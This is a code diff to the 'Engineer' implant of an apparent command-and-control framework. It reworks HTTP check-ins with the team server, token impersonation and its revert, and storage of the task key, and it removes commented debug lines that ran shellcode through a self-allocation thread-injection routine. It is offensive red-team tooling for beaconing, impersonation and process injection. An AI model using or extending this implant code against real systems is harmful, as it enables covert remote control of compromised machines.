@@ -13,6 +13,8 @@ using System.Security.Principal;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using System.Management.Automation;
+using System.Security;
 
 namespace Engineer
 {
@@ -22,7 +24,9 @@ namespace Engineer
         private static CancellationTokenSource _tokenSource;
         internal static EngineerMetadata _metadata;
         internal static WindowsIdentity ImpersonatedUser;
+        internal static WindowsImpersonationContext oldImpersonationContext;
         internal static bool ImpersonatedUserChanged = false;
+        internal static bool RevertedToSelf = false;
         internal static List<IEngineerCommand> _commands = new List<IEngineerCommand>(); // Assigned here because its not assigned in main so assigning it somewhere else would localsize the assignment other 3 are assigned the objects in Main func.
         public static string ManagerType = "{{REPLACE_MANAGER_TYPE}}";
         public static ConcurrentDictionary<string, EngTCPComm> TcpChildCommModules = new ConcurrentDictionary<string, EngTCPComm>(); // key is the current engineers children engineerId, value is the TCP comm, for that child
@@ -33,7 +37,7 @@ namespace Engineer
         private static string WorkHoursEnd = "{{REPLACE_WORK_HOURS_END}}";      // time of day an operation stops for the day 
         private static string WorkHoursStart = "{{REPLACE_WORK_HOURS_START}}"; // time of day an operation starts for that day
         public static bool IsEncrypted = false;
-        public static string UniqueTaskKey = "{{REPLACE_UNIQUE_TASK_KEY}}";
+        public static SecureString UniqueTaskKey;
         public static string MessagePathKey = "{{REPLACE_MESSAGE_PATH_KEY}}";
         public static string MetadataKey = "{{REPLACE_METADATA_KEY}}";
         public static int P2PNumber = int.TryParse("{{REPLACE_P2P_NUMBER}}", out P2PNumber) ? P2PNumber : -1;
@@ -93,13 +97,13 @@ namespace Engineer
                 }
                 else if(ManagerType.Equals("http", StringComparison.CurrentCultureIgnoreCase) || ManagerType.Equals("https",StringComparison.CurrentCultureIgnoreCase))
                 {
-                   _commModule = new EngHttpComm(@"{{REPLACE_CONNECTION_IP}}", int.Parse("{{REPLACE_CONNECTION_PORT}}"), "{{REPLACE_ISSECURE_STATUS}}", int.Parse("{{REPLACE_CONNECTION_ATTEMPTS}}"), int.Parse("{{REPLACE_SLEEP_TIME}}"),"{{REPLACE_URLS}}", "{{REPLACE_COOKIES}}", "{{REPLACE_REQUEST_HEADERS}}", "{{REPLACE_USERAGENT}}");
+                   _commModule = new EngHttpComm(@"{{REPLACE_CONNECTION_IP}}", int.Parse("{{REPLACE_CONNECTION_PORT}}"), "{{REPLACE_ISSECURE_STATUS}}", int.Parse("{{REPLACE_CONNECTION_ATTEMPTS}}"), int.Parse("{{REPLACE_SLEEP_TIME}}"),"{{REPLACE_URLS}}".Split(',').ToList(), "{{REPLACE_EVENT_URLS}}".Split(',').ToList(), "{{REPLACE_COOKIES}}".Split(',').ToList(), "{{REPLACE_REQUEST_HEADERS}}".Split(',').ToList(), "{{REPLACE_USERAGENT}}");
                 }
                 else
                 {
                     //comm module for testing on connect to 8080 ave ot turn off other one. 
                     Thread.Sleep(15000); // sleep for testing cause i have to start eng with other programs and need time to start a manager. 
-                    _commModule = new EngHttpComm(@"127.0.0.1", int.Parse("8080"), "false", int.Parse("1000"), int.Parse("5"),"/index.html,/","SESSIONID","AcceptVALUEjson/application", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246");
+                    _commModule = new EngHttpComm(@"127.0.0.1", int.Parse("8080"), "false", int.Parse("1000"), int.Parse("5"),new List<string>() { "/index.html,/" }, new List<string>() { "/event,/e" }, new List<string>() { "SESSIONID" },new List<string>() { "AcceptVALUEjson/application" }, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246");
                     ManagerType = "http";
                 }
                 
@@ -121,10 +125,7 @@ namespace Engineer
 
                 bool isInjected = Functions.InjectionTest.Injection_Test();
                 
-                //DEBUG REMOVE LATER
-                //var testshell = File.ReadAllBytes("D:\\Share between vms\\calc_shellcode.bin");
-                //Task.Run(async () => Extra.Inj_techs.SelfAllocCreateThread(testshell));
-                //DEBUG END
+               
 
                 _tokenSource = new CancellationTokenSource();
                 while (!_tokenSource.IsCancellationRequested) // if Teamserver isnt up or goes down while eng is running it gets stuck in this loop
@@ -138,8 +139,12 @@ namespace Engineer
                         }
                         if (ImpersonatedUserChanged)
                         {
-                            ImpersonatedUser.Impersonate();
+                            oldImpersonationContext = ImpersonatedUser.Impersonate();
                             ImpersonatedUserChanged = false;
+                        }
+                        if (RevertedToSelf)
+                        {
+                            oldImpersonationContext.Undo();
                         }
 
                         //if tasking.EngTaskResults contains any tasks with the status of running then IsTaskExecuting = true
@@ -158,15 +163,22 @@ namespace Engineer
                         {
                            await Task.Run(() =>_commModule.PostData());   //send task response data to server
                         }
+                        //http checkin with server
                         else if (ManagerType.Equals("http", StringComparison.CurrentCultureIgnoreCase) || ManagerType.Equals("https", StringComparison.CurrentCultureIgnoreCase))
                         {
-                            //get tasks
-                           await Task.Run(() => _commModule.CheckIn());      //http checkin with server
+                           await Task.Run(() => _commModule.CheckIn());      
                         }
-                        if (_commModule.RecvData(out var tasks))
+                        //if we got new tasking process it
+                        if(!_commModule.Inbound.IsEmpty)
                         {
-                            Tasking.DealWithTasks(tasks);
+                            await _commModule.CheckForDataProcess();
                         }
+                        //check a second time if we should be responding with a task result
+                        if (!_commModule.Outbound.IsEmpty)
+                        {
+                            await Task.Run(() => _commModule.PostData());   //send task response data to server
+                        }
+
                         while (!_commModule.P2POutbound.IsEmpty && ManagerType.Equals("tcp", StringComparison.CurrentCultureIgnoreCase))
                         {
                            // Console.WriteLine($"{DateTime.UtcNow} tcp engineer has p2p outbound to put in parents queue");
@@ -245,42 +257,7 @@ namespace Engineer
                             Thread.Sleep(10);
                         }
                         //helps with cpu use
-                        Thread.Sleep(5);
-                        
-                        
-                        
-                        
-                        
-                        // //if WorkingHoursEnd equal UTCTimeNow then Sleep until WorkingHoursStart
-                        // DateTime endHours;
-                        // DateTime startHours;
-                        // if (DateTime.TryParse(WorkHoursStart, out startHours))
-                        // {
-                        //     if (DateTime.TryParse(WorkHoursEnd, out endHours))
-                        //     {
-                        //        // Console.WriteLine($"endHours is a valid time of {endHours}");
-                        //     }
-                        //     else
-                        //     {
-                        //        // Console.WriteLine($"DateTime unable to parse {WorkHoursEnd}");
-                        //     }
-                        //
-                        //     if (endHours.Minute == DateTime.UtcNow.Minute)
-                        //     {
-                        //         //while the current hour is not the start hour sleep
-                        //         while (DateTime.UtcNow.Minute != startHours.Minute)
-                        //         {
-                        //             if (Sleeptype == SleepTypes.Custom_RC4)
-                        //             {
-                        //                 Functions.SleepEncrypt.ExecuteSleep(EngCommBase.Sleep); //if we did not recvData and we have no data to send sleep for a bit
-                        //             }
-                        //             else if (Sleeptype == SleepTypes.None)
-                        //             {
-                        //                 Thread.Sleep(EngCommBase.Sleep);
-                        //             }
-                        //         }
-                        //     }
-                        // }
+                        Thread.Sleep(2); 
                     }
                     catch (Exception ex)
                     {
@@ -300,7 +277,13 @@ namespace Engineer
         
 		private static void GenerateMetadata()
         {
-            
+            UniqueTaskKey = new SecureString();
+            foreach (char c in "{{REPLACE_UNIQUE_TASK_KEY}}")
+            {
+                UniqueTaskKey.AppendChar(c);
+            }
+
+
             var process = Process.GetCurrentProcess();              //loads current process Info
             var identity = WindowsIdentity.GetCurrent();            //The identity object encapsulates information about the user
             var principal = new WindowsPrincipal(identity);         //The principal object represents the security context under which code is running.
